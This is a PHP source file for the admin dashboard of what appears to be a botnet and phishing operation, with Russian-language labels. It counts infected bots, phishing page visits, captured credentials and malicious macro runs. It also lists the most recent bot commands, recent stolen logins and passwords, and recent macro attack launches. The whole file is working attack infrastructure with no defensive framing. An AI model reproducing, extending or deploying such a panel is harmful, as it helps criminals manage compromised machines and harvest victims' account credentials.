<?php
echo '

<div class="col-lg-12">



        <div class="row">
            <div class="col-lg-3 col-md-6">
                <div class="panel panel-primary">
                    <div class="panel-heading">
                        <div class="row">
                            <div class="col-xs-3">
                                <i class="fa fa-comments fa-5x"></i>
                            </div>
                            <div class="col-xs-9 text-right">';
                                include ('bd.php');
                                mysqli_set_charset($link, "utf8");
                                $query = mysqli_query($link, "SELECT COUNT(DISTINCT client_id) FROM tasks");

                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $count = $row[0];
                                    echo "<div class='huge'>$count</div>";
                                    }
                                echo '
                                <div>Кол-во ботов</div>
                            </div>
                        </div>
                    </div>
                    <a href="hta/">
                        <div class="panel-footer">
                            <span class="pull-left">Посмотреть детали</span>
                            <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                            <div class="clearfix"></div>
                        </div>
                    </a>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-6">
                <div class="panel panel-yellow">
                    <div class="panel-heading">
                        <div class="row">
                            <div class="col-xs-3">
                                <i class="fa fa-sort-amount-desc fa-5x"></i>
                            </div>
                            <div class="col-xs-9 text-right">';

                                $query = mysqli_query($link, "SELECT COUNT(*) FROM logs_visited WHERE ip IS NOT NULL AND ip <> '' AND login IS NOT NULL AND login <> '' AND user_agent IS NOT NULL AND user_agent <> '' AND referer IS NOT NULL AND referer <> '' AND time ;");

                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $count = $row[0];
                                    echo "<div class='huge'>$count</div>";
                                    }

                                echo '
                                <div>Переходы на сайт</div>
                            </div>
                        </div>
                    </div>
                    <a href="phishing/">
                        <div class="panel-footer">
                            <span class="pull-left">Посмотреть детали</span>
                            <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                            <div class="clearfix"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="col-lg-3 col-md-6">
                <div class="panel panel-red">
                    <div class="panel-heading">
                        <div class="row">
                            <div class="col-xs-3">
                                <i class="fa fa-database fa-5x"></i>
                            </div>
                            <div class="col-xs-9 text-right">';
                                $query = mysqli_query($link, "SELECT COUNT(*) FROM logs_phishing WHERE ip IS NOT NULL AND ip <> '' AND id IS NOT NULL AND id <> '' AND login IS NOT NULL AND login <> '' AND password IS NOT NULL AND password <> '' AND user_agent IS NOT NULL AND user_agent <> '' AND referer IS NOT NULL AND referer <> '' AND time ;");

                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $count = $row[0];
                                    echo "<div class='huge'>$count</div>";
                                    }

                                echo '
                                <div>Фишинг</div>
                            </div>
                        </div>
                    </div>
                    <a href="phishing/">
                        <div class="panel-footer">
                            <span class="pull-left">Посмотреть детали</span>
                            <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                            <div class="clearfix"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="col-lg-3 col-md-6" align="center">
                <div class="panel panel-red">
                    <div class="panel-heading">
                        <div class="row">
                            <div class="col-xs-3">
                                <i class="fa fa-tasks fa-5x"></i>
                            </div>
                            <div class="col-xs-9 text-right">';

                                $query = mysqli_query($link, "SELECT COUNT(DISTINCT client_id) FROM logs_makros");
                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $count = $row[0];
                                    echo "<div class='huge'>$count</div>";
                                    }
                                echo '

                                <div> Макросы</div>
                            </div>
                        </div>
                    </div>
                    <a href="makros/">
                        <div class="panel-footer">
                            <span class="pull-left">Посмотреть детали</span>
                            <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                            <div class="clearfix"></div>
                        </div>
                    </a>
                </div>
            </div>


            

                <div class="col-lg-4">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <h3 class="panel-title"><i class="fa fa-clock-o fa-fw"></i> Последние команды</h3>
                        </div>
                        <div class="panel-body">
                            <div class="list-group">';
                                $query = mysqli_query($link, "SELECT id,client_id,operation,argument_human,time FROM tasks WHERE client_id IS NOT NULL AND client_id <> '' AND operation IS NOT NULL AND operation <> '' AND argument IS NOT NULL AND argument <> '' AND argument_human IS NOT NULL AND argument_human <> '' ORDER BY time DESC LIMIT 5");

                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $id = $row[0];
                                    $client_id = $row[1];
                                    $operation = $row[2];
                                    $argument_human = $row[3];
                                    $time = preg_replace('/\\d{4}-\\d{2}-\\d{2}/i', '', $row[4]);
                                    echo "<a href='hta/view_detail.php?id=$id&i=$client_id' class='list-group-item'>
                                                <span class='badge'>$time</span>
                                                <i class='fa fa-fw fa-calendar'></i> $client_id - $argument_human
                                          </a>";
                                    }

                                echo'
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-4">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <h3 class="panel-title"><i class="fa fa-clock-o fa-fw"></i> Последние учетные записи</h3>
                        </div>
                        <div class="panel-body">
                            <div class="list-group">';

                            $query = mysqli_query($link, "SELECT id,login,password,time FROM logs_phishing WHERE id IS NOT NULL AND id <> '' AND login IS NOT NULL AND login <> '' AND password IS NOT NULL AND password <> '' AND user_agent IS NOT NULL AND user_agent <> '' AND referer IS NOT NULL AND referer <> '' ORDER BY time DESC LIMIT 5");

                            while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                {
                                $id = $row[0];
                                $login = $row[1];
                                $password = $row[2];
                                $time = preg_replace('/\\d{4}-\\d{2}-\\d{2}/i', '', $row[3]);
                                echo "<a href='phishing/' class='list-group-item'>
                                            <span class='badge'>$time</span>
                                             <i class='fa fa-fw fa-calendar'></i> id $id - $login / $password
                                     </a>";
                                }
                            echo'
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            <h3 class="panel-title"><i class="fa fa-clock-o fa-fw"></i> Последние запуски макросов</h3>
                        </div>
                        <div class="panel-body">
                            <div class="list-group">';
                                $query = mysqli_query($link, "SELECT attack,client_id,user,time FROM logs_makros WHERE attack IS NOT NULL AND attack <> '' AND client_id IS NOT NULL AND client_id <> '' AND user IS NOT NULL AND user <> '' ORDER BY time DESC LIMIT 5");

                                while ($row = mysqli_fetch_array($query, MYSQLI_NUM))
                                    {
                                    $attack = $row[0];
                                    $client_id = $row[1];
                                    $user = $row[2];
                                    $time = preg_replace('/\\d{4}-\\d{2}-\\d{2}/i', '', $row[3]);
                                    echo "<a href='makros/' class='list-group-item'>
                                            <span class='badge'>$time</span>
                                            <i class='fa fa-fw fa-calendar'></i> $attack - $client_id $user
                                          </a>";
                                    }
                                echo'

                            </div>
                        </div>
                    </div>
                </div>
        </div>
    </div>

';
?>
